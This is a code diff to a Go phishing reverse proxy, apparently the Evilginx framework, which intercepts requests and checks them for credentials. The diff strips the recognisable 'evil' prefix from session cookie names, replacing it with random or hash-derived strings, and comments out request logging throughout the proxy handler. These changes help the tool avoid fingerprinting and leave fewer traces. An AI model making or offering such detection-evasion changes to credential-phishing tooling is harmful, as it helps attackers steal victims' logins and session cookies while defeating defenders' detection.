@@ -140,7 +140,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = "evil" + GenRandomString(4) // TODO: make cookie name identifiable
+	p.cookieName = GenRandomString(8) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -157,7 +157,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			log.Info("Request Before: %v", req)
+			//log.Info("Request Before: %v", req)
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -698,7 +698,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
-				log.Info("Request Before Cred check: %v", req)
+				//log.Info("Request Before Cred check: %v", req)
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
@@ -754,7 +754,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
-							log.Info("Request Before Forec Post: %v", req)
+							//log.Info("Request Before Forec Post: %v", req)
 							// force post json
 							for _, fp := range pl.forcePost {
 								if fp.path.MatchString(req.URL.Path) {
@@ -894,7 +894,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				log.Info("Request Before Intercept: %v", req)
+				//log.Info("Request Before Intercept: %v", req)
 				// check if request should be intercepted
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -920,7 +920,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 				}
-			log.Info("Request Final: %v", req)
+			//log.Info("Request Final: %v", req)
 			return req, nil
 		})
 
@@ -2030,6 +2030,6 @@ func getContentType(path string, data []byte) string {
 func getSessionCookieName(pl_name string, cookie_name string) string {
 	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
 	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = "evil" + "-" + s_hash[4:]
+	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
